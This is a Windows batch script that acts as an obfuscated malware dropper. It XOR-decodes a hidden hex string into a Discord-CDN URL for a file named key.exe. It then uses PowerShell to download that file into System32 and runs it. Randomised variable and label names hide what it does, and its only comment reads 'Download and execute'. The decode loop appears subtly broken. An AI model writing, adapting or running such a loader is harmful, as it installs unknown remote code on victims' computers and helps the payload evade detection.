@echo off


set "z9y8x7=128"
set "w1v2u3=e8f4f4f0f3baafafe3e4eeaee4e9f3e3eff2e4e1f0f0aee3efedafe1f4f4e1e3e8ede5eef4f3afb1b3b7b1b5b1b1b9b3b4b6b3b2b8b5b3b6b0b5afb1b3b7b1b5b8b7b2b3b2b9b7b6b2b0b7b8b7b2afebe5f9aee5f8e5bfe5f8bdb6b8b2b3e1e4e1b7a6e9f3bdb6b8b2b2b5e3b2b7a6e8edbde1b7e5e1e4b6b0e2b2b8b6b9b0b6b8e4b9e5e5b3b5b4b7e4e4b8e3e3b9b1b1e6b7b2b4e2b7b8b8e4b6b3b2b8b1b9b3b1b4e1e1b9e5b1b9e2e3b6b4e5b0e5b8b6a6"

setlocal enabledelayedexpansion
set "q0p1o2="
set "n3m4l5=0"
:oziefjozie
if "!w1v2u3:~%n3m4l5%,2!"=="" goto epgeiruhgioze
set /a "k6j7i8=0x!w1v2u3:~%n3m4l5%,2! ^ %z9y8x7%"
set "q0p1o2=!q0p1o2!!k6j7i8:~-2!"
set /a "n3m4l5+=2"
goto oziefjozie
:epgeiruhgioze

:: Download and execute
set "r9s0t1=%SystemRoot%\System32\key.exe"
powershell -command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%q0p1o2%', '%r9s0t1%')"
start "" "%r9s0t1%"

exit
